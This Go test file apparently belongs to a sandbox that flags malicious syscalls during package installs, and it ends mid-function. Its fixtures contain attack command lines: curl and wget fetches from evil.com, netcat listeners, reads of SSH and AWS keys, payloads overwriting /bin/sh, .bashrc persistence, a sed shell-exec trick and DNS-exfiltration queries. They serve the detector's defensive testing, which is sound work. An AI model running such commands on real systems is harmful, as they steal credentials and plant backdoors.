package analyzer

import (
	"reflect"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/RalianENG/kojuto/internal/types"
)

const (
	riskCritical = "critical"
	riskHigh     = "high"
	riskMedium   = "medium"
	riskNone     = "none"
)

func TestAnalyze_Clean(t *testing.T) {
	verdict, filtered := Analyze(nil)
	if verdict != types.VerdictClean {
		t.Errorf("expected clean, got %s", verdict)
	}

	if len(filtered) != 0 {
		t.Errorf("expected 0 filtered events, got %d", len(filtered))
	}

	verdict, _ = Analyze([]types.SyscallEvent{})
	if verdict != types.VerdictClean {
		t.Errorf("expected clean for empty slice, got %s", verdict)
	}
}

func TestAnalyze_Suspicious(t *testing.T) {
	events := []types.SyscallEvent{
		{
			Timestamp: time.Now(),
			PID:       1234,
			Syscall:   types.EventConnect,
			Family:    2,
			DstAddr:   "203.0.113.50",
			DstPort:   443,
		},
	}

	verdict, filtered := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious, got %s", verdict)
	}

	if len(filtered) != 1 {
		t.Errorf("expected 1 suspicious event, got %d", len(filtered))
	}
}

func TestAnalyze_FiltersLoopback(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventConnect, DstAddr: "127.0.0.1", DstPort: 80, Family: 2},
		{Syscall: types.EventConnect, DstAddr: "::1", DstPort: 80, Family: 10},
		{Syscall: types.EventSendto, DstAddr: "0.0.0.0", DstPort: 53, Family: 2},
	}

	verdict, filtered := Analyze(events)
	if verdict != types.VerdictClean {
		t.Errorf("expected clean after filtering loopback, got %s", verdict)
	}

	if len(filtered) != 0 {
		t.Errorf("expected 0 suspicious events, got %d", len(filtered))
	}
}

func TestAnalyze_FiltersBenignExec(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/usr/bin/python", Cmdline: "python setup.py"},
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c echo hello"},
	}

	verdict, _ := Analyze(events)
	if verdict != types.VerdictClean {
		t.Errorf("expected clean for benign exec, got %s", verdict)
	}
}

// TestAnalyze_CurlMultiLayerDefense documents the multi-layer defense
// model for network tools like curl during install:
//
//   - Layer 1 (containment): the sandbox enforces --network=none, so
//     curl cannot actually reach the destination.
//   - Layer 2 (harm-firing detection): the connect() syscall fires
//     regardless of network availability and is classified as
//     c2_communication (HIGH).
//   - Layer 3 (forensic chain): the curl execve itself is still
//     recorded as CategoryUnknownBinary (LOW) so the analyst sees the
//     full process tree, but it does not flip the verdict on its own
//     (avoids classifying every binary kojuto doesn't recognize as
//     malicious — see classifyExecve rationale).
//
// Realistic malicious curl always triggers a connect() and so trips
// Layer 2. Curl invoked in isolation (without any network call) is
// not malicious and correctly stays clean.
func TestAnalyze_CurlMultiLayerDefense(t *testing.T) {
	// Curl execve in isolation: no harm-firing syscall captured.
	// Recorded for forensic visibility, but verdict stays clean.
	curlAlone := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/usr/bin/curl", Cmdline: "curl --version"},
	}
	verdict, filtered := Analyze(curlAlone)
	if verdict != types.VerdictClean {
		t.Errorf("expected clean for execve-only (Layer 3 forensic record), got %s", verdict)
	}
	if len(filtered) != 1 || filtered[0].Category != types.CategoryUnknownBinary {
		t.Errorf("expected single CategoryUnknownBinary event, got %v", filtered)
	}

	// Realistic malicious curl: execve + connect. Layer 2
	// (c2_communication on the connect) flips the verdict.
	curlWithConnect := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/usr/bin/curl", Cmdline: "curl http://evil.com/payload"},
		{Syscall: types.EventConnect, DstAddr: "203.0.113.42", DstPort: 443, Family: 2},
	}
	verdict, filtered = Analyze(curlWithConnect)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious when connect fires (Layer 2), got %s", verdict)
	}
	var sawC2 bool
	for _, e := range filtered {
		if e.Category == types.CategoryC2 {
			sawC2 = true
			break
		}
	}
	if !sawC2 {
		t.Errorf("expected a c2_communication event in %v", filtered)
	}
}

func TestAnalyze_ShellCBenign(t *testing.T) {
	// pip/setuptools routinely call sh -c with compiler and file commands.
	benignCases := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c gcc -o output.o input.c"},
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c echo hello"},
		{Syscall: types.EventExecve, Comm: "/usr/bin/bash", Cmdline: "bash -c pkg-config --libs python3"},
		{Syscall: types.EventExecve, Comm: "/bin/dash", Cmdline: "dash -c command -v gcc"},
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c 'cp file1 file2'"},
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c \"mkdir -p /install/lib\""},
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c test -f /usr/include/stdio.h"},
		// Benign command chains (all segments are safe commands).
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c 'mkdir -p /install/lib && cp file1 /install/lib/'"},
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c gcc -o out.o in.c && strip out.o"},
		// File ops targeting non-trusted directories are fine.
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c cp file1 /install/lib/file1"},
	}

	verdict, filtered := Analyze(benignCases)
	if verdict != types.VerdictClean {
		t.Errorf("expected clean for benign sh -c, got %s with %d events", verdict, len(filtered))
		for _, e := range filtered {
			t.Logf("  flagged: %s %q", e.Comm, e.Cmdline)
		}
	}
}

// TestAnalyze_ShellCMultiLayer documents that sh -c attack patterns are
// caught by the downstream harm-firing rule that observes the actual
// side-effect syscall, not by the sh -c execve event alone. The
// execve cmdline is recorded for forensic chain visibility
// (CategoryUnknownBinary, LOW) but does not flip the verdict on its
// own — see the classifyExecve design rationale.
//
// Each case below pairs the sh -c trigger with the harm syscall that
// a real package would emit. The verdict comes from the harm rule.
//
// Cases without a follow-up harm event (sh -c standalone, no actual
// network/file/exec activity) stay clean by design — there is no
// harm to detect. Static analyzers (GuardDog and similar) handle the
// pre-firing intent inspection at the source-code layer.
func TestAnalyze_ShellCMultiLayer(t *testing.T) {
	orig := sensitivePathPatterns
	defer func() { sensitivePathPatterns = orig }()
	SetSensitivePaths([]string{"/.ssh/", "/.aws/"})

	cases := []struct {
		name        string
		events      []types.SyscallEvent
		wantHighCat string // the rule that should fire HIGH
	}{
		{
			name: "sh -c then /tmp execve (fileless attack)",
			events: []types.SyscallEvent{
				{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c /tmp/malware"},
				{Syscall: types.EventExecve, Comm: "/tmp/malware", Cmdline: "/tmp/malware"},
			},
			wantHighCat: types.CategoryCodeExecution, // L546 suspiciousExecDirs
		},
		{
			name: "sh -c curl then connect (c2)",
			events: []types.SyscallEvent{
				{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c curl http://evil.com/payload"},
				{Syscall: types.EventExecve, Comm: "/usr/bin/curl", Cmdline: "curl http://evil.com/payload"},
				{Syscall: types.EventConnect, DstAddr: "203.0.113.5", DstPort: 80, Family: 2},
			},
			wantHighCat: types.CategoryC2,
		},
		{
			name: "sh -c wget then connect (c2)",
			events: []types.SyscallEvent{
				{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c wget http://evil.com -O /tmp/x"},
				{Syscall: types.EventConnect, DstAddr: "203.0.113.10", DstPort: 80, Family: 2},
			},
			wantHighCat: types.CategoryC2,
		},
		{
			name: "sh -c nc then bind (backdoor)",
			events: []types.SyscallEvent{
				{Syscall: types.EventExecve, Comm: "/bin/dash", Cmdline: "dash -c nc -l 4444"},
				{Syscall: types.EventBind, DstAddr: "0.0.0.0", DstPort: 4444, Family: 2},
			},
			wantHighCat: types.CategoryBackdoor,
		},
		{
			name: "sh -c reads ssh key (credential access)",
			events: []types.SyscallEvent{
				{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c cat /home/dev/.ssh/id_rsa"},
				{Syscall: types.EventOpenat, FilePath: "/home/dev/.ssh/id_rsa", OpenFlags: "O_RDONLY"},
			},
			wantHighCat: types.CategoryCredentialAccess,
		},
		{
			name: "sh -c cp overwrites system binary (binary hijack)",
			events: []types.SyscallEvent{
				{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c cp /tmp/payload /usr/local/bin/python3"},
				{Syscall: types.EventOpenat, FilePath: "/usr/local/bin/python3", OpenFlags: "O_WRONLY|O_CREAT"},
			},
			wantHighCat: types.CategoryBinaryHijack,
		},
		{
			name: "sh -c mv overwrites /bin/sh (binary hijack)",
			events: []types.SyscallEvent{
				{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c mv /tmp/backdoor /bin/sh"},
				{Syscall: types.EventRename, SrcPath: "/tmp/backdoor", DstPath: "/bin/sh"},
			},
			wantHighCat: types.CategoryBinaryHijack,
		},
		{
			name: "sh -c writes .bashrc (persistence)",
			events: []types.SyscallEvent{
				{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c 'echo evil >> ~/.bashrc'"},
				{Syscall: types.EventOpenat, FilePath: "/home/alice/.bashrc", OpenFlags: "O_WRONLY|O_APPEND"},
			},
			wantHighCat: types.CategoryPersistence,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			verdict, filtered := Analyze(tc.events)
			if verdict != types.VerdictSuspicious {
				t.Errorf("expected suspicious (harm-firing layer should catch), got %s", verdict)
			}
			var sawTarget bool
			for _, e := range filtered {
				if e.Category == tc.wantHighCat {
					sawTarget = true
					break
				}
			}
			if !sawTarget {
				cats := make([]string, 0, len(filtered))
				for _, e := range filtered {
					cats = append(cats, e.Category)
				}
				t.Errorf("expected category %q to fire, got categories %v", tc.wantHighCat, cats)
			}
		})
	}
}

// TestAnalyze_ShellCStandaloneIsLow documents the inverse: a sh -c
// event with NO follow-up harm syscall must NOT flip the verdict by
// itself. This is the case that motivated the demotion — native-
// module preinstall hooks like `sh -c "cross-env FOO=bar
// node-gyp-build"` are legitimate and produce no harm syscalls when
// the build is benign. Flagging them on cmdline content alone made
// every clean npm package with native compilation register as
// suspicious.
func TestAnalyze_ShellCStandaloneIsLow(t *testing.T) {
	cases := []string{
		"sh -c cross-env ZERO_AR_DATE=1 node-gyp-build",
		"sh -c node-gyp-build-test",
		"sh -c prebuild-install || node-gyp rebuild",
		"sh -c 'echo $(curl evil.com)'",       // no actual connect → clean
		"sh -c 'find /tmp -exec /tmp/x {} ;'", // no actual /tmp execve → clean
	}
	for _, cmdline := range cases {
		t.Run(cmdline, func(t *testing.T) {
			verdict, filtered := Analyze([]types.SyscallEvent{
				{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: cmdline},
			})
			if verdict != types.VerdictClean {
				t.Errorf("expected clean for sh -c without follow-up harm syscall, got %s", verdict)
			}
			if len(filtered) != 1 || filtered[0].Category != types.CategoryUnknownBinary {
				t.Errorf("expected single CategoryUnknownBinary event, got %v", filtered)
			}
		})
	}
}

func TestAnalyze_PythonCInlineCode(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/usr/bin/python3", Cmdline: "python3 -c import os; os.system('id')"},
	}

	verdict, _ := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for python3 -c, got %s", verdict)
	}
}

func TestAnalyze_BasenameSpoofing(t *testing.T) {
	// Attacker copies malware to /tmp/python3 — path must be checked, not just basename.
	events := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/tmp/python3", Cmdline: "python3 setup.py"},
	}

	verdict, _ := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for /tmp/python3 (basename spoofing), got %s", verdict)
	}
}

func TestAnalyze_EmptyDstAddr(t *testing.T) {
	// A connect event with empty address means the parser failed.
	// Must NOT be treated as benign.
	events := []types.SyscallEvent{
		{Syscall: types.EventConnect, DstAddr: "", DstPort: 443, Family: 2},
	}

	verdict, _ := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for empty DstAddr, got %s", verdict)
	}
}

func TestAnalyze_OpenatSensitive(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.ssh/id_rsa", OpenFlags: "O_RDONLY"},
	}

	verdict, filtered := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for SSH key access, got %s", verdict)
	}
	if len(filtered) != 1 {
		t.Errorf("expected 1 suspicious event, got %d", len(filtered))
	}
}

func TestAnalyze_RenameTrustedBinary(t *testing.T) {
	cases := []struct {
		name    string
		dstPath string
		want    string
	}{
		{"python3 hijack", "/usr/local/bin/python3", types.VerdictSuspicious},
		{"node hijack", "/usr/local/bin/node", types.VerdictSuspicious},
		{"sh hijack", "/bin/sh", types.VerdictSuspicious},
		{"new CLI script", "/usr/local/bin/my-tool", types.VerdictClean},
		{"install dir", "/install/lib/module.so", types.VerdictClean},
		{"tmp rename", "/tmp/a", types.VerdictClean},
		// Basename-only DstPath: the eBPF probe captures only the
		// dentry name from vfs_rename's renamedata, not the parent
		// path. Without the parent we can't verify the rename is in
		// a trusted dir, so a basename matching a system binary must
		// stay suspicious. Otherwise an eBPF-mode scan of a malware
		// sample that renames over /usr/local/bin/python3 silently
		// reports CLEAN.
		{"basename-only python3 (eBPF mode)", "python3", types.VerdictSuspicious},
		{"basename-only sh (eBPF mode)", "sh", types.VerdictSuspicious},
		{"basename-only unknown (eBPF mode)", "myapp", types.VerdictClean},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			events := []types.SyscallEvent{
				{Syscall: types.EventRename, SrcPath: "/tmp/payload", DstPath: tc.dstPath},
			}
			verdict, _ := Analyze(events)
			if verdict != tc.want {
				t.Errorf("expected %s for dst=%s, got %s", tc.want, tc.dstPath, verdict)
			}
		})
	}
}

func TestAnalyze_BindListenAccept(t *testing.T) {
	// Server socket operations are always suspicious.
	for _, syscall := range []string{types.EventBind, types.EventListen, types.EventAccept} {
		events := []types.SyscallEvent{
			{Syscall: syscall, DstAddr: "0.0.0.0", DstPort: 4444},
		}
		verdict, _ := Analyze(events)
		if verdict != types.VerdictSuspicious {
			t.Errorf("expected suspicious for %s, got %s", syscall, verdict)
		}
	}
}

func TestAnalyze_DNSTunneling(t *testing.T) {
	// DNS tunneling: sendto to loopback:53 with suspicious query.
	// Using loopback so only the DNS query content determines the verdict
	// (loopback is normally benign, but tunneling overrides that).
	tunnelCases := []struct {
		name  string
		query string
		want  string
	}{
		// Suspicious: base64-encoded data in subdomain.
		{"base64 exfil", "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q.evil.com", types.VerdictSuspicious},
		// Suspicious: hex-encoded data in subdomain.
		{"hex exfil", "68656c6c6f20776f726c6420746869732069732061.evil.com", types.VerdictSuspicious},
		// Suspicious: very long query.
		{"long query", "aaaaaaaaaa.bbbbbbbbbb.cccccccccc.dddddddddd.eeeeeeeeee.ffffffffff.gggggggggg.hhhhhhhhhh.evil.com", types.VerdictSuspicious},
		// Clean: normal domain lookup (short labels, low entropy).
		{"normal domain", "www.google.com", types.VerdictClean},
		// Clean: pypi.org (benign suffix).
		{"pypi lookup", "files.pythonhosted.org", types.VerdictClean},
		// Clean: npm registry.
		{"npm lookup", "registry.npmjs.org", types.VerdictClean},
		// Clean: short subdomain.
		{"short sub", "api.github.com", types.VerdictClean},
		// Clean: only two labels (no subdomain to tunnel through).
		{"two labels", "evil.com", types.VerdictClean},
	}

	for _, tc := range tunnelCases {
		t.Run(tc.name, func(t *testing.T) {
			// Two events because dns_tunneling is a MEDIUM-severity
			// signal — a single high-entropy DNS query can be a CDN
			// hash, but two from the same scan is a tunneling pattern.
			events := []types.SyscallEvent{
				{Syscall: types.EventSendto, DstAddr: "127.0.0.1", DstPort: 53, Family: 2, DNSQuery: tc.query},
				{Syscall: types.EventSendto, DstAddr: "127.0.0.1", DstPort: 53, Family: 2, DNSQuery: tc.query},
			}
			verdict, _ := Analyze(events)
			if verdict != tc.want {
				t.Errorf("expected %s for query=%q, got %s", tc.want, tc.query, verdict)
			}
		})
	}
}

func TestShannonEntropy(t *testing.T) {
	// Low entropy: repeated character.
	if e := shannonEntropy("aaaaaaa"); e > 0.1 {
		t.Errorf("expected low entropy for 'aaaaaaa', got %f", e)
	}

	// High entropy: random-looking base64.
	if e := shannonEntropy("aGVsbG8gd29ybGQ"); e < 3.0 {
		t.Errorf("expected high entropy for base64, got %f", e)
	}

	// Empty string.
	if e := shannonEntropy(""); e != 0 {
		t.Errorf("expected 0 entropy for empty string, got %f", e)
	}
}

// TestAnalyze_SedShellExecDefense documents that sed's shell-execution
// abuse (e.g. `sed -e '1e cat /etc/passwd'`) is caught by the
// harm-firing layer when sed actually spawns a shell, not by a
// blanket sed-is-suspicious rule.
//
// sed in isolation is recorded as CategoryUnknownBinary (LOW) —
// legitimate build scripts (autoconf, configure, make) invoke sed
// constantly and we cannot blanket-flag sed without huge FP in source
// builds. When sed's `e` command actually fires, the spawned `sh -c
// <cmd>` is observed as a separate execve event and trips the
// existing sh -c branch (HIGH), preserving detection.
func TestAnalyze_SedShellExecDefense(t *testing.T) {
	// sed alone is recorded for forensics but does not flip the
	// verdict — there is no observable harm yet.
	sedAlone := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/usr/bin/sed", Cmdline: "sed -e s/foo/bar/ input"},
	}
	verdict, filtered := Analyze(sedAlone)
	if verdict != types.VerdictClean {
		t.Errorf("expected clean for sed in isolation, got %s", verdict)
	}
	if len(filtered) != 1 || filtered[0].Category != types.CategoryUnknownBinary {
		t.Errorf("expected single CategoryUnknownBinary event, got %v", filtered)
	}

	// sed's `e` command actually fires a shell that reads a
	// sensitive path. After the L563 demotion the verdict comes from
	// the openat on the sensitive file (credential_access HIGH), not
	// from cmdline inspection. sed and its child shell are recorded
	// at LOW; the openat is the verdict driver.
	orig := sensitivePathPatterns
	defer func() { sensitivePathPatterns = orig }()
	SetSensitivePaths([]string{"/.ssh/", "/.aws/"})

	sedSpawnsShell := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/usr/bin/sed", Cmdline: "sed -e 1e cat /home/dev/.ssh/id_rsa input"},
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c cat /home/dev/.ssh/id_rsa"},
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.ssh/id_rsa", OpenFlags: "O_RDONLY"},
	}
	verdict, filtered = Analyze(sedSpawnsShell)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious when sed-spawned shell reads .ssh, got %s", verdict)
	}
	var sawCred bool
	for _, e := range filtered {
		if e.Category == types.CategoryCredentialAccess {
			sawCred = true
			break
		}
	}
	if !sawCred {
		t.Errorf("expected credential_access from the openat, got %v", filtered)
	}
}

// ---------------------------------------------------------------------------
// GenerateSummary
// ---------------------------------------------------------------------------

func TestGenerateSummary_Clean(t *testing.T) {
	s := GenerateSummary(types.VerdictClean, nil)
	if s.RiskLevel != riskNone {
		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskNone)
	}
	if s.Description == "" {
		t.Error("expected non-empty description for clean verdict")
	}
}

func TestGenerateSummary_Inconclusive(t *testing.T) {
	s := GenerateSummary(types.VerdictInconclusive, nil)
	if s.RiskLevel != riskMedium {
		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskMedium)
	}
	if s.Remediation == "" {
		t.Error("expected non-empty remediation for inconclusive verdict")
	}
}

func TestGenerateSummary_C2(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventConnect, DstAddr: "203.0.113.50", DstPort: 443, Category: types.CategoryC2},
	}
	s := GenerateSummary(types.VerdictSuspicious, events)
	if s.RiskLevel != riskCritical {
		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskCritical)
	}
	found := false
	for _, c := range s.Categories {
		if c == types.CategoryC2 {
			found = true
		}
	}
	if !found {
		t.Errorf("expected categories to include %q, got %v", types.CategoryC2, s.Categories)
	}
}

func TestGenerateSummary_CredentialAccess(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.ssh/id_rsa", Category: types.CategoryCredentialAccess},
	}
	s := GenerateSummary(types.VerdictSuspicious, events)
	if s.RiskLevel != riskCritical {
		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskCritical)
	}
	if !strings.Contains(s.Remediation, "rotate") {
		t.Errorf("remediation should mention 'rotate', got %q", s.Remediation)
	}
}

func TestGenerateSummary_CodeExecutionOnly(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/usr/bin/curl", Cmdline: "curl http://evil.com", Category: types.CategoryCodeExecution},
	}
	s := GenerateSummary(types.VerdictSuspicious, events)
	if s.RiskLevel != riskMedium {
		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskMedium)
	}
}

func TestGenerateSummary_BinaryHijack(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventRename, SrcPath: "/tmp/payload", DstPath: "/usr/local/bin/python3", Category: types.CategoryBinaryHijack},
	}
	s := GenerateSummary(types.VerdictSuspicious, events)
	if s.RiskLevel != riskHigh {
		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskHigh)
	}
}

// ---------------------------------------------------------------------------
// classify (tested through Analyze)
// ---------------------------------------------------------------------------

func TestClassify_Connect(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventConnect, DstAddr: "203.0.113.50", DstPort: 443, Family: 2},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryC2 {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryC2)
	}
}

func TestClassify_SendtoWithDNS(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventSendto, DstAddr: "8.8.8.8", DstPort: 53, Family: 2,
			DNSQuery: "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q.evil.com"},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryDNSTunnel {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryDNSTunnel)
	}
}

func TestClassify_SendtoWithoutDNS(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventSendto, DstAddr: "203.0.113.50", DstPort: 8080, Family: 2},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryC2 {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryC2)
	}
}

func TestClassify_Openat(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.aws/credentials", OpenFlags: "O_RDONLY"},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryCredentialAccess {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryCredentialAccess)
	}
}

func TestClassify_Rename(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventRename, SrcPath: "/tmp/payload", DstPath: "/usr/local/bin/python3"},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryBinaryHijack {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryBinaryHijack)
	}
}

func TestClassify_BindListenAccept(t *testing.T) {
	for _, syscall := range []string{types.EventBind, types.EventListen, types.EventAccept} {
		t.Run(syscall, func(t *testing.T) {
			events := []types.SyscallEvent{
				{Syscall: syscall, DstAddr: "0.0.0.0", DstPort: 4444},
			}
			_, filtered := Analyze(events)
			if len(filtered) != 1 {
				t.Fatalf("expected 1 event for %s, got %d", syscall, len(filtered))
			}
			if filtered[0].Category != types.CategoryBackdoor {
				t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryBackdoor)
			}
		})
	}
}

func TestClassify_ExecvePythonC(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/usr/bin/python3", Cmdline: "python3 -c import os; os.system('id')"},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryCodeExecution {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryCodeExecution)
	}
}

// ---------------------------------------------------------------------------
// portStr
// ---------------------------------------------------------------------------

func TestPortStr(t *testing.T) {
	if got := portStr(0); got != "?" {
		t.Errorf("portStr(0) = %q, want %q", got, "?")
	}
	if got := portStr(443); got != "443" {
		t.Errorf("portStr(443) = %q, want %q", got, "443")
	}
}

// ---------------------------------------------------------------------------
// truncate
// ---------------------------------------------------------------------------

func TestTruncate(t *testing.T) {
	short := "hello"
	if got := truncate(short, 10); got != "hello" {
		t.Errorf("truncate(%q, 10) = %q, want %q", short, got, "hello")
	}

	long := "abcdefghij"
	if got := truncate(long, 5); got != "abcde..." {
		t.Errorf("truncate(%q, 5) = %q, want %q", long, got, "abcde...")
	}

	exact := "abcde"
	if got := truncate(exact, 5); got != "abcde" {
		t.Errorf("truncate(%q, 5) = %q, want %q", exact, got, "abcde")
	}
}

func TestHasAllowedDir(t *testing.T) {
	allowed := []string{"/usr/bin/", "/usr/local/bin/", "/bin/"}
	for _, d := range allowed {
		if !hasAllowedDir(d) {
			t.Errorf("hasAllowedDir(%q) = false, want true", d)
		}
	}
	disallowed := []string{"/tmp/", "/sbin/", "/home/dev/", ""}
	for _, d := range disallowed {
		if hasAllowedDir(d) {
			t.Errorf("hasAllowedDir(%q) = true, want false", d)
		}
	}
}

func TestAnalyze_ClassifiesReasonField(t *testing.T) {
	// Verify that Analyze populates Reason field on suspicious events.
	events := []types.SyscallEvent{
		{Syscall: types.EventConnect, DstAddr: "1.2.3.4", DstPort: 443, Family: 2},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Reason == "" {
		t.Error("expected non-empty Reason after Analyze")
	}
}

func TestGenerateSummary_DNSTunnel(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventSendto, Category: types.CategoryDNSTunnel},
	}
	s := GenerateSummary(types.VerdictSuspicious, events)
	if s.RiskLevel != riskHigh {
		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskHigh)
	}
}

func TestGenerateSummary_Backdoor(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventBind, Category: types.CategoryBackdoor},
	}
	s := GenerateSummary(types.VerdictSuspicious, events)
	if s.RiskLevel != riskCritical {
		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskCritical)
	}
}

func TestGenerateSummary_DataExfil(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventSendto, Category: types.CategoryDataExfil},
	}
	s := GenerateSummary(types.VerdictSuspicious, events)
	if s.RiskLevel != riskCritical {
		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskCritical)
	}
}

// ---------------------------------------------------------------------------
// classifyOpenat (via Analyze)
// ---------------------------------------------------------------------------

func TestClassify_OpenatRead(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.aws/credentials", OpenFlags: "O_RDONLY"},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryCredentialAccess {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryCredentialAccess)
	}
	if !strings.Contains(filtered[0].Reason, "Read") {
		t.Errorf("reason should mention Read, got %q", filtered[0].Reason)
	}
}

func TestClassify_OpenatWriteSensitive(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.ssh/id_rsa", OpenFlags: "O_WRONLY"},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	// Write to /home/ is classified as persistence (sandbox structural
	// whitelist: pip/npm never write to the user home directory).
	if filtered[0].Category != types.CategoryPersistence {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryPersistence)
	}
	if !strings.Contains(filtered[0].Reason, "Write") {
		t.Errorf("reason should mention Write, got %q", filtered[0].Reason)
	}
}

func TestClassify_SandboxDetectionPaths(t *testing.T) {
	tests := []struct {
		name    string
		path    string
		wantCat string
	}{
		{"proc self status", "/proc/self/status", types.CategoryEvasion},
		{"proc self maps", "/proc/self/maps", types.CategoryEvasion},
		{"proc self cgroup", "/proc/self/cgroup", types.CategoryEvasion},
		{"proc pid comm", "/proc/42/comm", types.CategoryEvasion},
		{"sys class net", "/sys/class/net", types.CategoryEvasion},
		{"ssh key read", "/home/dev/.ssh/id_rsa", types.CategoryCredentialAccess},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			events := []types.SyscallEvent{
				{Syscall: types.EventOpenat, FilePath: tc.path, OpenFlags: "O_RDONLY"},
			}
			_, filtered := Analyze(events)
			if len(filtered) != 1 {
				t.Fatalf("expected 1 event, got %d", len(filtered))
			}
			if filtered[0].Category != tc.wantCat {
				t.Errorf("category = %q, want %q", filtered[0].Category, tc.wantCat)
			}
		})
	}
}

func TestMatchExfilService(t *testing.T) {
	tests := []struct {
		domain string
